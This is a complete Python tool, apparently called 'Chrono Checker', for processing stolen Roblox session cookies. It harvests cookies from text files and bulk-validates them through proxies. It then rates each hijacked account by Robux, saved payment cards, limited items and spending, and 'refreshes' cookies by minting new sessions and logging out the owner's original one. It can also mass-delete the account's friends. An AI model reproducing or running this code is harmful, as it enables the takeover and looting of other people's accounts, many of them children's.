import requests
import time
import random
from time import sleep
from colorama import init, Fore, Style
from datetime import datetime
import aiohttp
import asyncio
import os
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import sys
import shutil
init()
text = "⏳Checked with Chrono Checker⏳"
### "rootPlace"
ids = {
109983668079237: "Steal a Brainrot",
126884695634066: "Grow a Garden",
13772394625: "Blade Ball",
8737899170: "Pet Simulator 99",
2788229376: "Da Hood",
920587237:  "Adopt Me",
142823291:   "Murder Mystery 2",
1730877806:  "Grand Piece Online",
606849621:  "Jailbreak",
2753915549:  "Blox Fruits",
1537690962:  "Bee Swarm Simulator",
15002061926: "Death Ball",
131623223084840: "Escape Tsunami For Brainrot"
}
### "id"
universe_ids = {
7709344486: "Steal a Brainrot",
7436755782: "Grow a Garden",
4777817887: "Blade Ball",
3317771874: "Pet Simulator 99",
1008451066: "Da Hood",
383310974:  "Adopt Me",
66654135:   "Murder Mystery 2",
648454481:  "Grand Piece Online",
245662005:  "Jailbreak",
994732206:  "Blox Fruits",
601130232:  "Bee Swarm Simulator",
5166944221: "Death Ball",
9363735110: "Escape Tsunami For Brainrot"
}
proxies_list = []
ascii_art = r"""                                                                                                                                                         
  ______ _                                ______ _                _                
 / _____) |                              / _____) |              | |               
| /     | | _   ____ ___  ____   ___    | /     | | _   ____ ____| |  _ ____  ____ 
| |     | || \ / ___) _ \|  _ \ / _ \   | |     | || \ / _  ) ___) | / ) _  )/ ___)
| \_____| | | | |  | |_| | | | | |_| |  | \_____| | | ( (/ ( (___| |< ( (/ /| |    
 \______)_| |_|_|   \___/|_| |_|\___/    \______)_| |_|\____)____)_| \_)____)_|    
                                                                                                                                                                                                                                                                                                                                   
"""
red = Fore.LIGHTRED_EX
green = Fore.LIGHTGREEN_EX
blue = Fore.LIGHTBLUE_EX
white = Fore.LIGHTWHITE_EX
reset = Style.RESET_ALL
def load_proxies():
    if not os.path.exists("proxies.txt"):
        open("proxies.txt", "w").close()
        return None
    with open("proxies.txt","r") as f:
        proxies_list = []
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                    proxies_list.append(line)
    if proxies_list:
        return proxies_list
    else:
        return None
def async_proxy():
    proxies = load_proxies()
    if proxies:
        proxy = random.choice(proxies)
        return proxy
    return None
def sync_proxy():
    proxies = load_proxies()
    if proxies:
        proxy = random.choice(proxies)
        proxy = {"http": proxy, "https": proxy}
        return proxy
    return None
def check_proxies():
    proxies = load_proxies()
    alive = []
    dead = []
    print(white + "Checking proxies..." + reset)
    if proxies:
        for proxy in proxies:
            try:
                proxy_check = {"http": proxy, "https": proxy}
                response = requests.get('https://httpbin.org/ip',proxies=proxy_check,timeout=10)
                if response.status_code == 200:
                    alive.append(proxy)
                else:
                    dead.append(proxy)
            except:
                dead.append(proxy)
        print(green + f"Alive proxies: {len(alive)}" + reset)
        for proxy in alive:
            print(green + proxy + reset)
        print(red + f"Dead proxies: {len(dead)} " + reset)
        for proxy in dead:
            print(red + proxy + reset)
        if dead:
            choose = input(white + "Delete dead proxies? (y/n) ")
            match choose:
                case "y":
                    with open("proxies.txt", "w", encoding="utf-8") as f:
                         for proxy in alive:
                             f.write(proxy + "\n")
                    print(green + "Dead Proxies deleted" + reset)
                case "n":
                    return
    else:
        print(red + "No proxies found..." + reset)
    input(white+"Press Enter to continue..."+reset)
def clear_logs():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(blue+ascii_art + reset)
def validation_cookie(cookie):
    proxy = sync_proxy()
    headers = {
        "Cookie": f".ROBLOSECURITY={cookie}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    try:
        user_info_request = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers,proxies=proxy, timeout=5)
        if user_info_request.status_code == 200:
            user_info = user_info_request.json()
            name = user_info['name']
            id = user_info['id']
            csrf_request = requests.post("https://friends.roblox.com/v1/users/1/unfriend",proxies=proxy, headers=headers)
            csrf_token = csrf_request.headers.get('x-csrf-token')
            headers = {
                "Cookie": f".ROBLOSECURITY={cookie}",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "X-CSRF-TOKEN": csrf_token,
                "Content-Type": "application/json"
            }
            return("valid",cookie, name, id,headers)
        else:
            return ('invalid', cookie)
    except Exception as e:
        print(f'Error: {e}')
        return ('error', cookie)
def get_csrf_token(cookie, proxy):
    headers = {
        "Cookie": f".ROBLOSECURITY={cookie}"
    }
    csrf_request = requests.post("https://friends.roblox.com/v1/users/1/unfriend", headers=headers, proxies=proxy, timeout=2)
    csrf_token = csrf_request.headers.get('x-csrf-token')
    return csrf_token
def validation():
    workers = int(input("Input number of workers: "))
    clear_logs()
    if not os.path.exists("Results"):
        os.makedirs("Results")
    if not os.path.exists("Results/Validator/Validated_Alltime"):
        os.makedirs("Results/Validator/Validated_Alltime")
    open("Results/Validator/Valids.txt", "w").close()
    open("Results/Validator/Invalids.txt", "w").close()
    open("Results/Validator/Errors.txt", "w").close()
    cookies = get_cookies()
    if not cookies:
        print("No cookies found!")
        return
    valid = 0
    invalid = 0
    errors = 0
    with ThreadPoolExecutor(max_workers=workers) as executor:
        start_time = time.time()
        results = executor.map(validation_cookie, cookies)
        for i, result in enumerate(results, 1):
            if result[0] == 'valid':
                valid += 1
                _, cookie, name, id,_ = result
                with open("Results/Validator/Valids.txt", "a", encoding="utf-8") as file:
                    file.write(f"Username: {name} | id: {id}\n")
                    file.write(f"{cookie}\n\n")
            elif result[0] == 'invalid':
                invalid += 1
                _, cookie = result
                with open("Results/Validator/Invalids.txt", "a", encoding="utf-8") as file:
                    file.write(f"{cookie}\n\n")
            elif result[0] == 'error':
                errors += 1
                _, cookie = result
                with open("Results/Validator/Errors.txt", "a", encoding="utf-8") as file:
                    file.write(f"{cookie}\n\n")
        end_time = time.time()
        print(green + f"Valid cookies: {valid}"+ white+ " | " + red+f"Invalid cookies: {invalid} | Errors: {errors}"+reset)
        print(white+f"Time: {end_time - start_time:.2f} seconds"+reset)
        now = datetime.now()
        formatted_time = now.strftime("%d.%m.%Y_%H.%M")
        os.makedirs(f"Results/Validator/Validated_Alltime/{formatted_time}",exist_ok=True)
        shutil.copy("Results/Validator/Valids.txt",f"Results/Validator/Validated_Alltime/{formatted_time}/Valids_{formatted_time}.txt")
        shutil.copy("Results/Validator/Invalids.txt",f"Results/Validator/Validated_Alltime/{formatted_time}/Invalids_{formatted_time}.txt")
async def solo_check_cookie(cookie):
    try:
        result = validation_cookie(cookie)
        if result[0] == 'valid':
            proxy = async_proxy()
            _, cookie, username, id, headers = result
            timeout = aiohttp.ClientTimeout(total=15)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                age = await UserAbove13(session, headers,proxy)
                country = await get_country(session, headers,proxy)
                create_date = await get_create_date(session, id, headers,proxy)
                email = await get_email(session, headers,proxy)
                Two_fa = await get_2fa(session, headers,proxy)
                robux = await get_robux(session, id, headers,proxy)
                pending = await get_pending(session, id, headers,proxy)
                billing = await get_billing(session, headers,proxy)
                card = await get_card(session, headers,proxy)
                premium = await get_premium(session, headers,proxy)
                rap = await get_RAP(session, id, headers,proxy)
                bundles = await get_bundles(session, id, headers,proxy)
                total, gamedonate = await get_total_and_gamedonate(session,id, headers,proxy)
                yeardonate = await get_1_year_donate(session,id,headers,proxy)
                off_donate = await get_official_donate(session,id,headers,proxy)
                fav_games = await get_favorite_games(session, id, headers,proxy)
                playtime = await get_playtime(session, headers,proxy)
                badges = "Off"
                result = (
                    f'Username: {username} | ID: {id} | Age: {age} | Country: {country} | Create Date: {create_date}\n'
                    f'Email: {email} | 2FA: {Two_fa}\n'
                    f'Robux: {robux} R$ | Pending: {pending} R$ | Billing: {billing} R$ | Card: {card}\n'
                    f'Premium: {premium} | RAP: {rap} R$ | Bundles: {bundles}\n'
                    f'Total: {total} R$ | Year-donate: {yeardonate} R$| Official-donate: {off_donate} R$ \n'
                    f'Badges: {badges}\n'
                    f'Favorite Games: {fav_games}\n'
                    f'Gamedonate: {gamedonate}\n'
                    f'Playtime: {playtime}\n\n{cookie}')
                return ('valid', result)
        elif result[0] == 'invalid':
            return ('invalid', cookie)
        else:
            return ('error', cookie)
    except Exception as e:
        print(red+ f'Error: {e}'+ reset)
        return("error",cookie)
async def get_email(session,headers,proxy):
    async with session.get("https://www.roblox.com/my/settings/json",proxy = proxy, headers=headers,timeout=5) as response:
        email_request = await response.json()
        email = email_request["IsEmailOnFile"]
        if email:
            email_status = email_request["IsEmailVerified"]
            if email_status == True:
                email_status = "Verified"
            else:
                email_status = "Unverified"
            email =f'{email}({email_status})'
            return email
        else:
            return False
async def get_create_date(session,id,headers,proxy):
    async with session.get(f"https://users.roblox.com/v1/users/{id}",proxy = proxy, headers=headers,timeout=5) as response:
        create_request = await response.json()
        create_date = datetime.strptime(create_request["created"],"%Y-%m-%dT%H:%M:%S.%fZ")
        create_date = create_date.strftime("%Y-%m-%d")
        return create_date
async def get_country(session,headers,proxy):
    async with session.get("https://accountsettings.roblox.com/v1/account/settings/account-country",proxy = proxy, headers=headers,timeout=5) as response:
        country_request = await response.json()
        country = country_request["value"]["countryName"]
        return country
async def get_robux(session,id,headers,proxy):
    async with session.get(f"https://economy.roblox.com/v1/users/{id}/currency",proxy = proxy,headers=headers,timeout=5) as response:
        robux_request = await response.json()
        robux = robux_request["robux"]
        return robux
async def get_billing(session,headers,proxy):
    async with session.get("https://billing.roblox.com/v1/credit",proxy = proxy,headers=headers,timeout=5) as response:
        billing_request = await response.json()
        billing = billing_request["robuxAmount"]
        return billing
async def get_card(session,headers,proxy):
    async with session.get("https://apis.roblox.com/payments-gateway/v1/payment-profiles",proxy = proxy,headers=headers,timeout=5) as response:
        if response.status == 200:
            data = await response.json()
            if data and len(data) > 0:
                return True
            else:
                return False
async def get_premium(session,headers,proxy):
    async with session.get("https://www.roblox.com/my/settings/json", proxy = proxy,headers=headers,timeout=5) as response:
        premium_request = await response.json()
        premium = premium_request["IsPremium"]
        return premium
async def UserAbove13(session,headers,proxy):
    async with session.get("https://www.roblox.com/my/settings/json",proxy = proxy, headers=headers,timeout=5) as response:
        age_request = await response.json()
        age = age_request["UserAbove13"]
        if age:
            age = "13+"
        else:
            age = "13-"
        return age
async def get_2fa(session,headers,proxy):
    async with session.get("https://www.roblox.com/my/settings/json",proxy = proxy, headers=headers,timeout=5) as response:
        twofa_request = await response.json()
        twofa = twofa_request["MyAccountSecurityModel"]["IsTwoStepEnabled"]
        return twofa
async def get_pending(session,id,headers,proxy):
    async with session.get(f"https://apis.roblox.com/transaction-records/v1/users/{id}/transaction-totals?usedTypes=2507808&timeFrame=Day&transactionType=summary", proxy = proxy,headers=headers,timeout=5) as response:
        pending_request = await response.json()
        pending = pending_request["pendingRobuxTotal"]
        return pending
async def get_1_year_donate(session, id, headers,proxy):
    try:
        async with session.get(f"https://apis.roblox.com/transaction-records/v1/users/{id}/transaction-totals?usedTypes=2539568&timeFrame=Year&transactionType=summary",proxy = proxy, headers=headers,timeout=5) as response:
            year_donate_request = await response.json()
            purchasesTotal = abs(year_donate_request["purchasesTotal"])
            return purchasesTotal
    except:
        return 0
async def get_official_donate(session,id,headers,proxy):
    total_donated = 0
    cursor = ""
    page = 1
    while True:
        url = f"https://apis.roblox.com/transaction-records/v1/users/{id}/transactions?cursor=&limit=100&transactionType=CurrencyPurchase&itemPricingType=PaidAndLimited"
        if cursor:
            url += f"&cursor={cursor}"
        async with session.get(url, headers=headers,proxy = proxy, timeout=5) as response:
            donate_request = await response.json()
            donates = donate_request.get("data", [])
            if not donates:
                break
            for donate in donates:
                amount = donate["currency"]["amount"]
                total_donated += amount
            cursor = donate_request.get("nextPageCursor")
            if not cursor:
                break
            page += 1
            await asyncio.sleep(0.3)
    return total_donated
async def get_total_and_gamedonate(session,id, headers,proxy):
    total_spent = 0
    cursor = ""
    page = 1
    game_totals = {}
    while True:
        url = f"https://apis.roblox.com/transaction-records/v1/users/{id}/transactions?limit=100&transactionType=Purchase"
        if cursor:
            url += f"&cursor={cursor}"
        async with session.get(url, headers=headers,proxy = proxy,timeout=5) as response:
            transactions_request = await response.json()
            transactions = transactions_request.get("data", [])
            if not transactions:
                break
            for transaction in transactions:
                amount = abs(transaction["currency"]["amount"])
                total_spent += amount
                details = transaction.get("details", {})
                place = details.get("place", {})
                place_id = place.get("universeId")
                if place_id in universe_ids:
                    game_name = universe_ids[place_id]
                    game_totals[game_name] = game_totals.get(game_name, 0) + amount
                    game_totals[game_name] += amount
            cursor = transactions_request.get("nextPageCursor")
            if not cursor:
                break
            page += 1
            await asyncio.sleep(0.3)
    if game_totals or total_spent:
        sorted_items = sorted(game_totals.items(), key=lambda x: x[1], reverse=True)
        result = []
        for game_name, total in sorted_items:
            result.append(f"{game_name}({total} R$)")
        game_totals = ', '.join(result)
        return total_spent, game_totals
    else:
        return total_spent, None
async def get_RAP(session,id,headers,proxy):
    total_RAP = 0
    items = 0
    cursor = ""
    page = 1
    while True:
        url = f"https://inventory.roblox.com/v1/users/{id}/assets/collectibles?limit=100"
        if cursor:
            url += f"&cursor={cursor}"
        async with session.get(url, headers=headers, proxy = proxy,timeout=5) as response:
            RAP_request = await response.json()
            RAP = RAP_request.get("data", [])
            if not RAP:
                break
            for i in RAP:
                amount = i["recentAveragePrice"]
                total_RAP += amount
                items += 1
            cursor = RAP_request.get("nextPageCursor")
            if not cursor:
                break
            page += 1
    total = f"{total_RAP}({items})"
    return total
async def get_bundles(session,id,headers,proxy):
    cursor = ""
    page = 1
    result = []
    while True:
        url = f"https://catalog.roblox.com/v1/users/{id}/bundles/1?cursor=&limit=100&sortOrder=Desc"
        if cursor:
            url += f"&cursor={cursor}"
        async with session.get(url, headers=headers,proxy = proxy, timeout=5) as response:
            bundles_request = await response.json()
            bundles = bundles_request.get("data", [])
            if not bundles: break
            for b in bundles:
                bundle = b["id"]
                if bundle == 192:
                    result.append("Korblox Deathspeaker")
                elif bundle == 201:
                    result.append("Headless Horseman")
            cursor = bundles_request.get("nextPageCursor")
            if not cursor:
                break
            page += 1
    if result: return result
async def get_badges(session,id,headers,proxy):
    GaG = [3181581226889239, 2432009301742310, 3495711621999816, 3310355054544865, 3195330021311033, 34852060037844, 3602894446235962, 4330691652818014, 2213702621912050,
           397821235877805, 3966694991137927, 674039989298417, 3833249137800902,
           3046817076424642, 1013473936180275, 4429839651101981, 393879997365151, 2585648043281722, 1089770809267851, 157951702469162, 2526153383283460, 4493388333080928]
    BSS = [1749468648, 1749519033, 1749523673, 1749534539, 1749564142, 1749566481, 1749568562, 1749570424, 1749604083, 1749606287, 1749608577, 1749610498, 1749628495, 1749630489,
           1749631489, 1749632737, 1749673718, 1749675237, 1749676247, 1749677419, 1749679114, 1749680097, 1749680902, 1749681692, 1749684261, 1749685928, 1749686750, 1749688211,
           1749770193, 1749771674, 1749772538, 1749773617, 1749775523, 1749776451, 1749777194, 1749779193, 1749780645, 1749781861, 1749782542, 1749783500, 1749784769, 1749786138,
           1749787209, 1749788323, 1749833884, 1749835166, 1749835972, 1749836699, 1749838495, 1749839078, 1749840246, 1749841052, 1749842402, 1749843985, 1749844635, 1749845555,
           1749846876, 1749847825, 1749848603, 1749849756, 1873772794, 1873774367, 1873775257, 1873779975, 1874442964, 1874445609, 1874446720, 1874447816, 1874484250, 1874485358,
           1874486035, 1874487127, 2124426329, 2124426330, 2124426331, 2124426332, 2124426333, 2124426334, 2124426335, 2124426336, 2124426337, 2124426338, 2124426339, 2124426340,
           2124426341, 2124426342, 2124426343, 2124426344, 2124426345, 2124442929, 2124442930, 2124442931, 2124442932, 2124442933, 2124443228, 2124443229, 2124443230, 2124443231,
           2124443232, 2124445684, 2124445842, 2124458125, 2124464509, 2124483313, 2124483314, 2124483315, 2124483316, 2124483317, 2124483366, 2124483367, 2124483368, 2124483369,
           2124483370, 2124520746, 2124634293, 3881408927508189, 2344504269751070, 4337039513419056, 740312413856621, 2455366474634025, 2277766631578968, 1004859870887507,
           1798036582894903, 4306688279772165, 272412157510801, 1816438215050824, 3832080365950522, 1043631905764417, 2330873832463422, 4168771208353755]
    BF = [2125253106, 2125253113]
    GPO = [2057554081948346, 2127154256, 2124828978, 2124636610]
    AV = [878251529804666, 4435567743462309, 3214286787375739, 4097459462607339, 2014804117905819, 2695191703902026]
    MM2 = [196198137,66654135,196198654,66654135,196198776,66654135,196199518,66654135,196200089,66654135,196200207,66654135,196200425,66654135,196200625,66654135,196200691,66654135,196200785,66654135]
    Adopt = [2124439922, 2124439923, 2124439924, 2124439925, 2124439926, 2124439927, 2124439928, 2129488028, 2129488030,
             135520552767917, 1048893619880427, 763171671267524, 925260774262149, 89650026776535, 292596439745713,
             1683279614525471, 1065569517641022, 3865916040798951, 160677344563654, 211728180632535, 639601989428398,
             2388128713374485, 2876404161740375, 2865954472113762]
    PS99 = [2153913164,3317771874,3189151177666639,3317771874,754796678735151,3317771874,327631483993374,3317771874]
    Jail = [958186367,245662005,958186842,245662005,958186941,245662005,958187053,245662005,958187226,245662005,958187343,245662005,958187470,245662005,2129891386,245662005]
    DB = 3143174433323990
    Tsunami = [3367369541266636,4209986891386443,473969329691563,2187399383396159,1795531447951741]
    badges = {
        "Grow a Garden": GaG,
        "Pet Simulator 99": PS99,
        "Adopt Me": Adopt,
        "Murder Mystery 2": MM2,
        "Grand Piece Online": GPO,
        "Jailbreak": Jail,
        "Blox Fruits": BF,
        "Bee Swarm Simulator": BSS,
        "Death Ball": [DB],
        "Escape Tsunami For Brainrot": Tsunami
    }
    list = []
    for game_name, badges_list in badges.items():
        badges_count = 0
        for badge in badges_list:
            async with session.get(f"https://inventory.roblox.com/v1/users/{id}/items/2/{badge}/is-owned",proxy = proxy, headers=headers) as response:
                badge_request = await response.json()
                if badge_request is True:
                    badges_count += 1
                result_badges_count = game_name,f"({badges_count})"
        if badges_count > 0:
            list.append(result_badges_count)
    formatted = ', '.join([f"{game} {count}" for game, count in list])
    if list: return formatted
async def get_favorite_games(session,id,headers,proxy):
    cursor = ""
    page = 1
    favoritegames= []
    while True:
        url = f"https://games.roblox.com/v2/users/{id}/favorite/games?limit=100"
        if cursor:
            url += f"&cursor={cursor}"
        async with session.get(url, headers=headers,proxy = proxy, timeout=5) as response:
            games_request = await response.json()
            games = games_request.get("data", [])
            if not games: break
            for game in games:
                game_id = game["rootPlace"]["id"]
                if game_id in ids:
                    game_name = game["name"]
                    favoritegames.append(game_name)
            cursor = games_request.get("nextPageCursor")
            if not cursor:
                break
            page += 1
            await asyncio.sleep(0.3)
    formatted = ', '.join([f"{game}" for game in favoritegames])
    if not favoritegames: formatted = None
    return formatted
async def get_playtime(session,headers,proxy):
    playtimes = []
    async with session.get("https://apis.roblox.com/parental-controls-api/v1/parental-controls/get-top-weekly-screentime-by-universe",proxy = proxy, headers=headers,timeout=5) as response:
        playtime_request = await response.json()
        playtime = playtime_request["universeWeeklyScreentimes"]
        if not playtime:
            return
        for game in playtime:
            game_id = game["universeId"]
            if game_id in universe_ids:
                minutes = game["weeklyMinutes"]
                playtime = (f"{universe_ids[game_id]} ({minutes} min)")
                playtimes.append(playtime)
    formatted = ', '.join([f"{game}" for game in playtimes])
    return formatted
def change_title():
    while True:
        os.system('title Chrono Checker')
        time.sleep(1)
        os.system('title owner: @ChronosRb')
        time.sleep(1)
threading.Thread(target=change_title, daemon=True).start()
def get_cookies():
    cookies_list = []
    pattern = r"_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[^\n]*"
    for f in os.listdir("Check"):
        if f.endswith(".txt"):
            with open(f"Check/{f}", "r", encoding="utf-8") as file:
                content = file.read()
                found = re.findall(pattern, content)
                cookies_list.extend(found)
    cookies_list =  list(set(cookies_list))
    print(white + f"Total Cookies: {len(cookies_list)}")
    return cookies_list
def single_check():
    input(white + "Press Enter to continue..." + reset)
    while True:
        cookie = input(white +"Input cookie:\n"+ reset)
        cookie = cookie.strip()
        if len(cookie) < 100:
            print("Its not cookie")
            continue
        return cookie
def delete_friends(cookie):
    result = validation_cookie(cookie)
    if result[0] == "valid":
        _, cookie, _, id, headers = validation_cookie(cookie)
        value_friends_request = requests.get(f"https://friends.roblox.com/v1/users/{id}/friends/count", headers=headers, timeout=5)
        value_friends = value_friends_request.json()
        total = value_friends['count']
        print(white+ f"Friends count: {total}")
        if total == 0:
            return
        print("Deleting friends...")
        total_deleted = 0
        while True:
            friends_request = requests.get(f"https://friends.roblox.com/v1/users/{id}/friends", headers=headers, timeout=5)
            friends = friends_request.json()
            friends_ids = [friend['id'] for friend in friends['data']]
            for friend in friends_ids:
                delete_friend_request = requests.post(f"https://friends.roblox.com/v1/users/{friend}/unfriend", headers=headers)
                total_deleted += 1
                percent = total_deleted / total
                bar_length = 30
                filled = int(bar_length * percent)
                bar = '█' * filled + '░' * (bar_length - filled)
                sys.stdout.write(f'\r|{bar}| {total_deleted}/{total}')
                sys.stdout.flush()
            value_friends_request = requests.get(f"https://friends.roblox.com/v1/users/{id}/friends/count",headers=headers, timeout=5)
            value_friends = value_friends_request.json()
            if value_friends['count'] != 0:
                continue
            else:
                break
        print(f"\nFriends deleted:{total_deleted}/{total}"+reset)
    else:
        print(red+ "Invalid cookie"+reset)
def refresh_cookie(cookie):
    proxy = sync_proxy()
    csrf = get_csrf_token(cookie,proxy)
    if not csrf:
        print("no csrf")
        return "Error", cookie
    headers = {
        "Cookie": f".ROBLOSECURITY={cookie}",
        "User-Agent": "Mozilla/5.0...",
        "X-CSRF-TOKEN": csrf,
        "Content-Type": "application/json",
        "RBXauthenticationNegotiation": "1",
        "referer": "https://www.roblox.com/ChronosRb"
    }
    for i in range(3):
        resp = requests.post(
            "https://auth.roblox.com/v1/authentication-ticket",headers=headers,json={},proxies = proxy,timeout=5)
        ticket = resp.headers.get('rbx-authentication-ticket')
        if ticket:
            break
        time.sleep(1)
    if not ticket:
        return "Error", cookie
    ticket = {"authenticationTicket": ticket}
    try:
        refresh_request = requests.post("https://auth.roblox.com/v1/authentication-ticket/redeem", headers={"rbxauthenticationnegotiation": "1"}, json=ticket, proxies = proxy,timeout=5)
        new_cookie = refresh_request.headers.get("set-cookie", "")
        if ".ROBLOSECURITY=" in new_cookie:
            new_cookie = new_cookie.split(".ROBLOSECURITY=")[1].split(";")[0]
            requests.post("https://auth.roblox.com/v2/logout",headers={"Cookie": f".ROBLOSECURITY={cookie}","X-CSRF-TOKEN": csrf},proxies = proxy)
            return "Success",new_cookie
        else:
            return "Error", cookie
    except Exception as e:
        print(red + e)
        print(cookie)
        return "Error", cookie
def multi_refreshing():
    workers = int(input("Input number of workers: "))
    clear_logs()
    cookies = get_cookies()
    if not cookies:
        print("No cookies found!")
        return
    if not os.path.exists("Results/Refresher"):
        os.makedirs("Results/Refresher")
    if not os.path.exists("Results/Refresher/Refreshed_Alltime"):
        os.makedirs("Results/Refresher/Refreshed_Alltime")
    open("Results/Refresher/Refreshed.txt", "w").close()
    open("Results/Refresher/Error_Refresh.txt", "w").close()
    refreshed = 0
    errors = 0
    with ThreadPoolExecutor(max_workers=workers) as executor:
        start_time = time.time()
        results = executor.map(refresh_cookie, cookies)
        for i, result in enumerate(results, 1):
            status, cookie = result
            if status == "Success" :
                refreshed += 1
                with open("Results/Refresher/Refreshed.txt", "a", encoding="utf-8") as file:
                    file.write(f"{cookie}\n\n")
            elif status == "Error" :
                errors += 1
                with open(f"Results/Refresher/Error_Refresh.txt", "a", encoding="utf-8") as file:
                    file.write(f"{cookie}\n\n")
        end_time = time.time()
        print(green + f"Refreshed cookie: {refreshed}; " + red + f"Not refreshed: {errors}"+reset)
        print(white + f"Time: {end_time - start_time:.2f} seconds" + reset)
        now = datetime.now()
        formatted_time = now.strftime("%d.%m.%Y_%H.%M")
        os.makedirs(f"Results/Refresher/Refreshed_Alltime/{formatted_time}",exist_ok=True)
        shutil.copy("Results/Refresher/Refreshed.txt", f"Results/Refresher/Refreshed_Alltime/{formatted_time}/Refreshed_{formatted_time}.txt")
        shutil.copy("Results/Refresher/Error_Refresh.txt",f"Results/Refresher/Refreshed_Alltime/{formatted_time}/Error_Refresh_{formatted_time}.txt")
def multi_check():
    workers = int(input("Input number of workers: "))
    clear_logs()
    cookies = get_cookies()
    if not cookies:
        print("No cookies found!")
        return
    if not os.path.exists("Results/Checker"):
        os.makedirs("Results/Checker")
    if not os.path.exists("Results/Checker/Checked_Alltime"):
        os.makedirs("Results/Checker/Checked_Alltime")
    open("Results/Checker/Valids.txt", "w").close()
    open("Results/Checker/Invalids.txt", "w").close()
    open("Results/Checker/Errors.txt", "w").close()
    async def run_check():
        semaphore = asyncio.Semaphore(workers)
        async def process(cookie):
            async with semaphore:
                return await solo_check_cookie(cookie)
        tasks = [process(c) for c in cookies]
        return await asyncio.gather(*tasks)
    start_time = time.time()
    results = asyncio.run(run_check())
    for i, result in enumerate(results, 1):
        status, cookie = result
        if status == "invalid":
            with open("Results/Checker/Invalids.txt", "a", encoding="utf-8") as f:
                f.write( cookie + "\n\n")
        elif status == "error":
            with open("Results/Checker/Errors.txt", "a", encoding="utf-8") as f:
                f.write(cookie + "\n\n")
        else:
            with open("Results/Checker/Valids.txt", "a", encoding="utf-8") as f:
                f.write(cookie + "\n\n")
    end_time = time.time()
    print(green + f"Checked cookies: {len(cookies)}")
    print(white + f"Time: {end_time - start_time:.2f} seconds" + reset)
def menu():
    import keyboard
    while True:
        clear_logs()
        print(white + "[1] Validator\n"
        "[2] Checker\n"
        "[3] Refresher\n"
        "[4] Friends Deleter\n"
        "[5] Check proxies\n"
        "[6] Settings\n"
        "[7] Exit\n"
        "press a key...\n"+ reset)
        choose = keyboard.read_key()
        time.sleep(0.5)
        match choose:
            case "1":
                clear_logs()
                print(white + "[1] Single Check\n"
                        "[2] Multi Check\n"
                        "press a key...\n" + reset)
                choose = keyboard.read_key()
                time.sleep(0.2)
                if choose == "1":
                    clear_logs()
                    cookie = single_check()
                    proxy = sync_proxy()
                    result = validation_cookie(cookie,proxy)
                    if result[0] == "valid":
                        clear_logs()
                        _, cookie, name, id,_ = result
                        print(green+"Valid cookie"+reset)
                        print(white+ f"id: {id} | Username: {name}\n"+ reset)
                        print(cookie)
                    else:
                        print(red+"Invalid cookie"+reset)
                    input(white + "\nPress Enter to continue..." + reset)
                elif choose == "2":
                    clear_logs()
                    validation()
                    input(white + "\nPress Enter to continue..." + reset)
            case "2":
                clear_logs()
                print(white + "[1] Single Check\n"
                        "[2] Multi Check\n"
                        "press a key...\n" + reset)
                choose = keyboard.read_key()
                time.sleep(0.2)
                if choose == "1":
                    clear_logs()
                    cookie = single_check()
                    result = validation_cookie(cookie)
                    if result[0] == "valid":
                        clear_logs()
                        _, cookie, name, id,_ = result
                        print(green+"Valid cookie"+reset)
                        print(white + "Start Checking...\n")
                        stats = asyncio.run(solo_check_cookie(cookie))
                        print(stats[1]+ reset)
                    else:
                        print(red+"Invalid cookie"+reset)
                    input(white + "\nPress Enter to continue..." + reset)
                elif choose == "2":
                    clear_logs()
                    multi_check()
                    input(white + "\nPress Enter to continue..." + reset)
            case "3":
                clear_logs()
                print(white + "[1] Single Refresh\n"
                              "[2] Multi Refresh\n"
                              "press a key...\n" + reset)
                choose = keyboard.read_key()
                time.sleep(0.2)
                if choose == "1":
                    clear_logs()
                    cookie = single_check()
                    result = validation_cookie(cookie)
                    if result[0] == "valid":
                        clear_logs()
                        _, cookie, name, id, headers = result
                        refresh_cookie(cookie)
                    else:
                        print(red + "Invalid cookie" + reset)
                    input(white + "\nPress Enter to continue..." + reset)
                elif choose == "2":
                    clear_logs()
                    multi_refreshing()
                    input(white + "\nPress Enter to continue..." + reset)
            case "4":
                clear_logs()
                cookie = single_check()
                clear_logs()
                delete_friends(cookie)
                input(white + "\nPress Enter to continue..." + reset)
            case "5":
                clear_logs()
                check_proxies()
            case "6":
                None
            case "7":
                print(red+"Closing checker..." + reset)
                sleep(1)
                break
menu()
